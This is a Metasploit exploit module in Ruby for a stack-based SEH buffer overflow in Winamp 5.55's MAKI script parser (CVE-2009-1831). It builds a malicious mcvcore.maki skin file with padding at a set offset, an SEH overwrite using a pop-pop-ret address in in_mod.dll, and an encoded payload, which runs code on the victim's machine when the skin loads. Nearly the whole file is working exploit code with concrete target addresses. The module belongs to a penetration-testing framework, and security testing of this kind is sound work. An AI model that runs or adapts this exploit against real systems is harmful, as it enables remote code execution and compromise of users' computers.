# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Winamp MAKI Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack based buffer overflow in Winamp 5.55. The flaw
        exists in the gen_ff.dll and occurs while parsing a specially crafted MAKI file,
        where memmove is used with in a insecure way with user controlled data.

        To exploit the vulnerability the attacker must convince the attacker to install the
        generated mcvcore.maki file in the "scripts" directory of the default "Bento" skin,
        or generate a new skin using the crafted mcvcore.maki file. The module has been
        tested successfully on Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Monica Sojeong Hong&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2009-1831&#039;],
          [ &#039;OSVDB&#039;, &#039;54902&#039;],
          [ &#039;BID&#039;, &#039;35052&#039;],
          [ &#039;EDB&#039;, &#039;8783&#039;],
          [ &#039;EDB&#039;, &#039;8772&#039;],
          [ &#039;EDB&#039;, &#039;8770&#039;],
          [ &#039;EDB&#039;, &#039;8767&#039;],
          [ &#039;URL&#039;, &#039;http://vrt-sourcefire.blogspot.com/2009/05/winamp-maki-parsing-vulnerability.html&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4000,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => ""
        },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # winamp.exe 5.5.5.2405
          [ &#039;Winamp 5.55 / Windows XP SP3 / Windows 7 SP1&#039;,
            {
              &#039;Ret&#039; => 0x12f02bc3, # ppr from in_mod.dll
              &#039;Offset&#039; => 16756
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;May 20 2009&#039;,
      &#039;DefaultTarget&#039;  => 0))

    deregister_options(&#039;FILENAME&#039;)
  end

  def file_format_filename
    &#039;mcvcore.maki&#039;
  end

  def exploit

    sploit = rand_text(target[&#039;Offset&#039;])
    sploit << generate_seh_record(target.ret)
    sploit << payload.encoded
    length_sploit = [sploit.length].pack("v")

    header = "\x46\x47" # magic
    header << "\x03\x04" # version
    header << "\x17\x00\x00\x00"
    types  = "\x01\x00\x00\x00" # count
    # class 1 => Object
    types << "\x71\x49\x65\x51\x87\x0D\x51\x4A\x91\xE3\xA6\xB5\x32\x35\xF3\xE7"
    # functions
    functions = "\x37\x00\x00\x00" # count
    #function 1
    functions << "\x01\x01" # class
    functions << "\x00\x00" # dummy
    functions << length_sploit # function name length
    functions << sploit # crafted function name

    maki = header
    maki << types
    maki << functions

    print_status("Creating &#039;#{file_format_filename}&#039; file ...")

    file_create(maki)

  end

end



